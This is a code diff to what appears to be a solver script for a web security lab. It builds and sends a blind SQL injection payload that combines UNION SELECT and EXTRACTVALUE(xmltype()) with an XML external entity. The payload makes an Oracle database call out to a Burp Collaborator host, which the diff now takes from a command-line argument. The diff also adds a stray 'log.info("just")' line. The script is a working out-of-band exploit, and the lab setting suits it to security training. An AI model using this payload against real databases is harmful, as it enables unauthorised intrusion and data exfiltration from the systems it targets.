@@ -34,7 +34,7 @@ def main(args):
           f"{tracking_id}'+UNION SELECT EXTRACTVALUE(xmltype('"
           '<?xml version="1.0" encoding="UTF-8"?>'
           "<!DOCTYPE root [ <!ENTITY % remote SYSTEM" 
-          f"\"http://BURP-COLLABORATOR-SUBDOMAIN/\">"
+          f"\"http://{args.collab}/\">"
           " %remote;]>'),'/l') FROM dual-- "
 )    
     exploit_encoded = urllib.parse.quote(exploit)
@@ -49,6 +49,7 @@ def main(args):
         resp = requests.get(shop.base_url, cookies=cookies, proxies=utils.PROXIES, verify=False
         )
     shop.is_solved()
+    log.info("just")
         
         
         
@@ -58,5 +59,5 @@ UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f
 +FROM+dual--
 """       
 if __name__ == "__main__":
-    args=utils.parse_args(sys.argv)
+    args=utils.parse_args_collab(sys.argv)
     main(args)
